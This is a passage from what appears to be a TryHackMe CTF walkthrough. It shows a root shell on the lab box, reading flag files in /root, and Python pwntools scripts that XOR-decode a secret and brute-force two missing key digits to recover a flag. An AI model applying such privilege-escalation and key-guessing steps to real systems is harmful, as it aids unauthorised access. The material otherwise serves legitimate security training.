[REDACTED]@482cbf2305ae:/home/F30s$ su root
su root
whoami;id;pwd
root
uid=0(root) gid=0(root) groups=0(root)
/home/F30s
```

### Get 2nd flag

Navigate to the `/root` directory and get 2 files:

```
root@482cbf2305ae:/home/F30s# cd /root
cd /root
root@482cbf2305ae:~# ls -l
ls -l
total 8
-rwx------ 1 root root 100 May 19  2023 flag2.txt
-rw-r----- 1 root root  17 May 19  2023 secret.txt
```

secret.txt

```
root@482cbf2305ae:~# cat secret.txt
cat secret.txt
b'C^_M@__DC\\7,'
```

flag2.txt

```
root@482cbf2305ae:~# cat flag2.txt
cat flag2.txt
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
```

From the `/secret-tip.txt` I found earlier, the last line was “_Don't forget it's always about root!_” → I try to re-use the previous decode Python script within `pwn.xor`, modify the key as `root` and replace the cipher with the content of `secret.txt`:

```python
def get_decrypted(cipher):
    return (pwn.xor(cipher, b'root')).decode('utf-8')

cipher = b'C^\_M@\_\_DC\\7,'
decoded_string = get_decrypted(cipher)
print(decoded_string)
```

And the result:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ python3 decode.py
[REDACTED]XX
```

Notice that there are 2 ‘`X`' characters at the end of the result. Combining with the message from `/secret-tip.txt` file “_I was missing 2 .. hmm .. what were they called?_”. If I replace the cipher key with the result but without 2 ‘`X`' characters like this:

```python
def get_decrypted(cipher):
	return (pwn.xor(cipher, b'[REDACTED]')).decode('utf-8')
```

The result would be:

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ python3 decode.py
THM{cronjokt^N3Eg_[REDACTED]}2g2WA`R}
```

Oh!! It’s really close!! OK, the last step is to find the correct 2 missing characters at “`XX`" and based on the string which is only containing numeric characters, I pretty sure that the 2 last “`XX`" must be digits too. Then I write the script to brute-force the flag by replacing numbers from 0 → 9 in to “`XX`" and finding the match result which would have “THM” and “cronjobs\_” inside:

```python
import pwn

cipher = b'ey}BQB*^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00*\x03]mD\x00W\x02gpScL'
key = "[REDACTED]{}" # {} is a placeholder for the XX digits

for i in range(100):
    formatted_string = bytes(key.format(str(i).zfill(2)), 'utf-8') # zfill ensures the number has two digits
    flag_decoded = (pwn.xor(cipher,formatted_string)).decode('utf-8')
    if "THM" in flag_decoded and "cronjobs" in flag_decoded:
        print(f"Flag: {flag_decoded} -- Key: {formatted_string}")
```

And Boom!

```
┌──(kali㉿kali)-[~/TryHackMe/supersecrettip]
└─$ python3 flag2_decoded.py
Flag: THM{cronjobs_[REDACTED]_t0g3THeR} -- Key: b'[REDACTED]'
```
